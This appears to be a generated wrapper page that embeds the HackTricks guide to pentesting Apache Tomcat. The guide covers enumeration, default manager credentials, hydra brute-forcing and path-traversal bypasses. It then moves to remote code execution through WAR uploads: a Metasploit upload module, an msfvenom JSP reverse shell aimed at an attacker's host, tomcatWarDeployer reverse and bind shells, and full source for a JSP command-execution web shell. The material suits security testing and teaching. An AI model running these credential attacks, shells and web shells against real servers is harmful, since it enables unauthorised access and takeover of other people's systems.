@@ -1,0 +1,113 @@
+---
+parsed_by: focuslocust
+source: hacktricks
+type: generated
+---
+# Tomcat
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `hacktricks` |
+| Type | `hacktricks-topic` |
+| Record ID | `hacktricks-network-services-pentesting-pentesting-web-tomcat-readme` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/tomcat/README.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [Tomcat](../../topics/network-services-pentesting/tomcat.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | hacktricks-network-services-pentesting-pentesting-web-tomcat-readme |
+| name | Tomcat |
+| type | hacktricks-topic |
+| source | hacktricks |
+| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/tomcat/README.md |
+
+## Preserved Source Material
+
+````yaml
+_body: "# Tomcat\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Discovery\n\n- It usually runs on **port 8080**\n\
+  - **Common Tomcat error:**\n\n<figure><img src=\"../../../images/image (150).png\" alt=\"\"><figcaption></figcaption></figure>\n\
+  \n## Enumeration\n\n### **Version Identification**\n\nTo find the version of Apache Tomcat, a simple command can be executed:\n\
+  \n```bash\ncurl -s http://tomcat-site.local:8080/docs/ | grep Tomcat\n```\n\nThis will search for the term \"Tomcat\" in\
+  \ the documentation index page, revealing the version in the title tag of the HTML response.\n\n### **Manager Files Location**\n\
+  \nIdentifying the exact locations of **`/manager`** and **`/host-manager`** directories is crucial as their names might\
+  \ be altered. A brute-force search is recommended to locate these pages.\n\n### **Username Enumeration**\n\nFor Tomcat versions\
+  \ older than 6, it's possible to enumerate usernames through:\n\n```bash\nmsf> use auxiliary/scanner/http/tomcat_enum\n\
+  ```\n\n### **Default Credentials**\n\nThe **`/manager/html`** directory is particularly sensitive as it allows the upload\
+  \ and deployment of WAR files, which can lead to code execution. This directory is protected by basic HTTP authentication,\
+  \ with common credentials being:\n\n- admin:admin\n- tomcat:tomcat\n- admin:\n- admin:s3cr3t\n- tomcat:s3cr3t\n- admin:tomcat\n\
+  \nThese credentials can be tested using:\n\n```bash\nmsf> use auxiliary/scanner/http/tomcat_mgr_login\n```\n\nAnother notable\
+  \ directory is **`/manager/status`**, which displays the Tomcat and OS version, aiding in vulnerability identification.\n\
+  \n### **Brute Force Attack**\n\nTo attempt a brute force attack on the manager directory, one can use:\n\n```bash\nhydra\
+  \ -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html\n```\n\nAlong\
+  \ with setting various parameters in Metasploit to target a specific host.\n\n## Common Vulnerabilities\n\n### **Password\
+  \ Backtrace Disclosure**\n\nAccessing `/auth.jsp` may reveal the password in a backtrace under fortunate circumstances.\n\
+  \n### **Double URL Encoding**\n\nThe CVE-2007-1860 vulnerability in `mod_jk` allows for double URL encoding path traversal,\
+  \ enabling unauthorized access to the management interface via a specially crafted URL.\n\nIn order to access to the management\
+  \ web of the Tomcat go to: `pathTomcat/%252E%252E/manager/html`\n\n### /examples\n\nApache Tomcat versions 4.x to 7.x include\
+  \ example scripts that are susceptible to information disclosure and cross-site scripting (XSS) attacks. These scripts,\
+  \ listed comprehensively, should be checked for unauthorized access and potential exploitation. Find [more info here](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)\n\
+  \n- /examples/jsp/num/numguess.jsp\n- /examples/jsp/dates/date.jsp\n- /examples/jsp/snp/snoop.jsp\n- /examples/jsp/error/error.html\n\
+  - /examples/jsp/sessions/carts.html\n- /examples/jsp/checkbox/check.html\n- /examples/jsp/colors/colors.html\n- /examples/jsp/cal/login.html\n\
+  - /examples/jsp/include/include.jsp\n- /examples/jsp/forward/forward.jsp\n- /examples/jsp/plugin/plugin.jsp\n- /examples/jsp/jsptoserv/jsptoservlet.jsp\n\
+  - /examples/jsp/simpletag/foo.jsp\n- /examples/jsp/mail/sendmail.jsp\n- /examples/servlet/HelloWorldExample\n- /examples/servlet/RequestInfoExample\n\
+  - /examples/servlet/RequestHeaderExample\n- /examples/servlet/RequestParamExample\n- /examples/servlet/CookieExample\n-\
+  \ /examples/servlet/JndiServlet\n- /examples/servlet/SessionExample\n- /tomcat-docs/appdev/sample/web/hello.jsp\n\n### **Path\
+  \ Traversal Exploit**\n\nIn some [**vulnerable configurations of Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)\
+  \ you can gain access to protected directories in Tomcat using the path: `/..;/`\n\nSo, for example, you might be able to\
+  \ **access the Tomcat manager** page by accessing: `www.vulnerable.com/lalala/..;/manager/html`\n\n**Another way** to bypass\
+  \ protected paths using this trick is to access `http://www.vulnerable.com/;param=value/manager/html`\n\n## RCE\n\nFinally,\
+  \ if you have access to the Tomcat Web Application Manager, you can **upload and deploy a .war file (execute code)**.\n\n\
+  ### Limitations\n\nYou will only be able to deploy a WAR if you have **enough privileges** (roles: **admin**, **manager**\
+  \ and **manager-script**). Those details can be find under _tomcat-users.xml_ usually defined in `/usr/share/tomcat9/etc/tomcat-users.xml`\
+  \ (it vary between versions) (see [POST ](#post)section).\n\n```bash\n# tomcat6-admin (debian) or tomcat6-admin-webapps\
+  \ (rhel) has to be installed\n\n# deploy under \"path\" context path\ncurl --upload-file monshell.war -u 'tomcat:password'\
+  \ \"http://localhost:8080/manager/text/deploy?path=/monshell\"\n\n# undeploy\ncurl \"http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell\"\
+  \n```\n\n### Metasploit\n\n```bash\nuse exploit/multi/http/tomcat_mgr_upload\nmsf exploit(multi/http/tomcat_mgr_upload)\
+  \ > set rhost <IP>\nmsf exploit(multi/http/tomcat_mgr_upload) > set rport <port>\nmsf exploit(multi/http/tomcat_mgr_upload)\
+  \ > set httpusername <username>\nmsf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>\nmsf exploit(multi/http/tomcat_mgr_upload)\
+  \ > exploit\n```\n\n### MSFVenom Reverse Shell\n\n1. Create the war to deploy:\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp\
+  \ LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war\n```\n\n2. Upload the `revshell.war` file and access to it (`/revshell/`):\n\
+  \n### Bind and reverse shell with [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)\n\nIn some scenarios\
+  \ this doesn't work (for example old versions of sun)\n\n#### Download\n\n```bash\ngit clone https://github.com/mgeeky/tomcatWarDeployer.git\n\
+  ```\n\n#### Reverse shell\n\n```bash\n./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT>\
+  \ <VICTIM_IP>:<VICTIM_PORT>/manager/html/\n```\n\n#### Bind shell\n\n```bash\n./tomcatWarDeployer.py -U <username> -P <password>\
+  \ -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/\n```\n\n### Using [Culsterd](https://github.com/hatRiot/clusterd)\n\
+  \n```bash\nclusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload\
+  \ -o windows\n```\n\n### Manual method - Web shell\n\nCreate **index.jsp** with this [content](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):\n\
+  \n```java\n<FORM METHOD=GET ACTION='index.jsp'>\n<INPUT name='cmd' type=text>\n<INPUT type=submit value='Run'>\n</FORM>\n\
+  <%@ page import=\"java.io.*\" %>\n<%\n   String cmd = request.getParameter(\"cmd\");\n   String output = \"\";\n   if(cmd\
+  \ != null) {\n      String s = null;\n      try {\n         Process p = Runtime.getRuntime().exec(cmd,null,null);\n    \
+  \     BufferedReader sI = new BufferedReader(new\nInputStreamReader(p.getInputStream()));\n         while((s = sI.readLine())\
+  \ != null) { output += s+\"</br>\"; }\n      }  catch(IOException e) {   e.printStackTrace();   }\n   }\n%>\n<pre><%=output\
+  \ %></pre>\n```\n\n```bash\nmkdir webshell\ncp index.jsp webshell\ncd webshell\njar -cvf ../webshell.war *\nwebshell.war\
+  \ is created\n# Upload it\n```\n\nYou could also install this (allows upload, download and command execution): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)\n\
+  \n### Manual Method 2\n\nGet a JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)\
+  \ and create a WAR file:\n\n```bash\nwget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp\n\
+  zip -r backup.war cmd.jsp\n# When this file is uploaded to the manager GUI, the /backup application will be added to the\
+  \ table.\n# Go to: http://tomcat-site.local:8180/backup/cmd.jsp\n```\n\n## POST\n\nName of Tomcat credentials file is `tomcat-users.xml`\
+  \ and this file indicates the role of the user inside tomcat.\n\n```bash\nfind / -name tomcat-users.xml 2>/dev/null\n```\n\
+  \nExample:\n\n```xml\n[...]\n<!--\n  By default, no user is included in the \"manager-gui\" role required\n  to operate\
+  \ the \"/manager/html\" web application.  If you wish to use this app,\n  you must define such a user - the username and\
+  \ password are arbitrary.\n\n  Built-in Tomcat manager roles:\n    - manager-gui    - allows access to the HTML GUI and\
+  \ the status pages\n    - manager-script - allows access to the HTTP API and the status pages\n    - manager-jmx    - allows\
+  \ access to the JMX proxy and the status pages\n    - manager-status - allows access to the status pages only\n-->\n[...]\n\
+  <role rolename=\"manager-gui\" />\n<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui\" />\n<role rolename=\"\
+  admin-gui\" />\n<user username=\"admin\" password=\"admin\" roles=\"manager-gui,admin-gui\" />\n```\n\n## Other tomcat scanning\
+  \ tools\n\n- [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)\n\n\
+  ## References\n\n- [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)\n\
+  - [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)\n\
+  \n{{#include ../../../banners/hacktricks-training.md}}"
+_relative_path: network-services-pentesting/pentesting-web/tomcat/README.md
+_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/tomcat/README.md
+````
